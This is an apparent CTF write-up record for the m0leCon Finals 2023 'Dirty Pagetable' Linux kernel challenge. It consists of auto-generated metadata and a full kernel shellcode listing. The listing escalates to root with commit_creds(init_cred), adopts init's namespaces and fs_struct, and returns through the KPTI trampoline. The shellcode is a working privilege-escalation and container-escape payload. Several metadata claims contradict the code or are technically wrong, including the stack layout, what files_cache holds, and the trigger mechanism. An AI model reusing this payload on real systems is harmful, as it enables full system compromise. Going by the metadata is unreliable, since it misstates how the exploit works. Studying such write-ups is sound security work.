---
title: Understanding Dirty Pagetable – m0leCon Finals 2023 CTF Writeup
contest: m0leCon Finals 2023
year: 2023
difficulty: hard
vuln_type: rop
tags:
- linux_kernel
- modprobe_path
- dirty_pagetable
- commit_creds
- find_task_by_vpid
- switch_task_namespaces
- copy_fs_struct
- kpti_trampoline
- userfaultfd
- custom_shellcode
- ret2usr_64
attack_chain: 通过 modprobe_path 触发自定义 shellcode → call a:pop r15 取 kaslr offset → commit_creds(init_cred) → find_task_by_vpid(1) → switch_task_namespaces(task, init_nsproxy) → copy_fs_struct(init_fs) → find_task_by_vpid(getpid()) → 改 current->fs=0x740 → kpti_bypass 跳回用户态
key_payload: lea rdi, [r15 + init_cred] / mov [rsp+0x00], rax (zero) / mov [rsp+0x10], 0x2222222222222222 (win) / mov rax, 0x3333333333333333 (cs)
one_liner: m0leCon Finals 2023 决出的 Linux 内核 PWN 题 Dirty Pagetable 完整 shellcode 复盘，覆盖 kaslr 定位+提权+namespace+fs+KPTI bypass 完整六件套。
lesson: Linux kernel exploit 的 6 步经典链：commit_creds(init_cred) → find_task_by_vpid(1) → switch_task_namespaces → copy_fs_struct → 改 current->fs → kpti_trampoline 跳回。
quality: high
full_path: Understanding_Dirty_Pagetable_–_m0leCon_Finals_2023_CTF_Writeup.full.md
meta_path: Understanding_Dirty_Pagetable_–_m0leCon_Finals_2023_CTF_Writeup.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: Understanding Dirty Pagetable – m0leCon Finals 2023 CTF Writeup。m0leCon Finals 2023 决出的 Linux 内核 PWN 题 Dirty Pagetable 完整 shellcode 复盘，覆盖 kaslr 定位+提权+namespace+fs+KPTI bypass 完整六件套。。经验：Linux kernel...
category: pwn
subcategory: rop
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/151200.html
wp_author: vpid
reasoning_chain:
- 触发点：m0leCon Finals + 题目 Dirty Pagetable → Linux kernel + files_cache slab → 假设：用 modprobe_path 触发自定义 shellcode
- 动作：cat /proc/slabinfo | grep files_cache → files_cache 920 920 704 23 4 → 观察：files_cache 是 fs_struct 副本来源
- 'shellcode 注入策略：call a; a: pop r15; sub r15, 0x24d4c9 → 触发点：拿到 kaslr offset = a 真实地址 - 0x24d4c9'
- 动作：lea rdi, [r15 + init_cred]; lea rax, [r15 + commit_creds]; call rax → 假设：commit_creds(init_cred) 提权到 root
- 动作：mov edi, 1; call find_task_by_vpid → 拿到 init_task（PID=1）→ switch_task_namespaces(task, init_nsproxy)
- 动作：copy_fs_struct(init_fs) 拿新 fs_struct → find_task_by_vpid(getpid()) → [rax + 0x740] = new_fs → 触发点：current->fs 字段偏移 0x740
- 假设：用户态与内核态切换需 KPTI bypass → 动作：rsp+0x00 写 0（CS 选择子）、rsp+0x10 写 0x2222... win、rsp+0x18 写 0x3333... cs、rsp+0x28 写 0x5555... ss
- jmp kpti_bypass trampoline → 用户态跳回 win 用户态函数 → 观察：执行 /readflag 拿到 flag
- 触发点：files_cache slab 中 fs_struct 是 copy-on-write 的 → 当 process 退出时 fs_struct 残留 → 假设：攻击者可借 UAF 篡改 fs_struct
failed_attempts:
- 试图用 ROP chain 直接改 modprobe_path → 失败：smep/smap 阻止 ROP 直接写用户态 buffer
- 试图只 commit_creds(init_cred) 不改 fs → 失败：root 用户若 fs 受限仍无法读 /readflag 等受限文件
- 试图跳回用户态时不设 KPTI trampoline → 失败：现代 kernel 强制 KPTI 切换会崩
key_observations:
- Linux kernel exploit 的 6 步经典链：commit_creds(init_cred) → find_task_by_vpid(1) → switch_task_namespaces → copy_fs_struct → 改 current->fs → kpti_trampoline 跳回
- files_cache slab 残留 fs_struct 提供 UAF 攻击面，是 2023+ kernel pwn 标配
- KPTI trampoline 必备寄存器：rsp+0x10 win / rsp+0x18 cs / rsp+0x28 ss / rsp+0x30 stack
- shellcode 入口 pop r15 取 kaslr offset 是无 ROP gadget 时的替代方案
- current->fs = 0x740 偏移是 fs_struct 在 task_struct 内的固定位置
prerequisites:
- Linux 内核内存管理（task_struct / cred / fs_struct 结构）
- KPTI bypass 原理（percpu trampoline + 寄存器恢复）
- shellcode 编写（汇编 + 系统调用约定）
- GDB 调试内核模块与符号解析
- modprobe_path 触发机制与文件缓存攻击面
---
# Understanding Dirty Pagetable – m0leCon Finals 2023 CTF Writeup

> 原文: https://www.ctfiot.com/151200.html
> ID: 151200


```
# cat /proc/slabinfo | grep files_cache
files_cache 920 920 704 23 4 : tunables 0 0 0 : slabdata 40 40 0
init_cred equ 0x1445ed8
 commit_creds equ 0x00ae620
 find_task_by_vpid equ 0x00a3750
 init_nsproxy equ 0x1445ce0
 switch_task_namespaces equ 0x00ac140
 init_fs equ 0x1538248
 copy_fs_struct equ 0x027f890
 kpti_bypass equ 0x0c00f41

_start:
 endbr64
 call a
a:
 pop r15
 sub r15, 0x24d4c9

 ; commit_creds(init_cred) [3]
 lea rdi, [r15 + init_cred]
 lea rax, [r15 + commit_creds]
 call rax

 ; task = find_task_by_vpid(1) [4]
 mov edi, 1
 lea rax, [r15 + find_task_by_vpid]
 call rax

 ; switch_task_namespaces(task, init_nsproxy) [5]
 mov rdi, rax
 lea rsi, [r15 + init_nsproxy]
 lea rax, [r15 + switch_task_namespaces]
 call rax

 ; new_fs = copy_fs_struct(init_fs) [6]
 lea rdi, [r15 + init_fs]
 lea rax, [r15 + copy_fs_struct]
 call rax
 mov rbx, rax

 ; current = find_task_by_vpid(getpid())
 mov rdi, 0x1111111111111111 ; will be fixed at runtime
 lea rax, [r15 + find_task_by_vpid]
 call rax

 ; current->fs = new_fs [8]
 mov [rax + 0x740], rbx

 ; kpti trampoline [9]
 xor eax, eax
 mov [rsp+0x00], rax
 mov [rsp+0x08], rax
 mov rax, 0x2222222222222222 ; win
 mov [rsp+0x10], rax
 mov rax, 0x3333333333333333 ; cs
 mov [rsp+0x18], rax
 mov rax, 0x4444444444444444 ; rflags
 mov [rsp+0x20], rax
 mov rax, 0x5555555555555555 ; stack
 mov [rsp+0x28], rax
 mov rax, 0x6666666666666666 ; ss
 mov [rsp+0x30], rax
 lea rax, [r15 + kpti_bypass]
 jmp rax

 int3
```
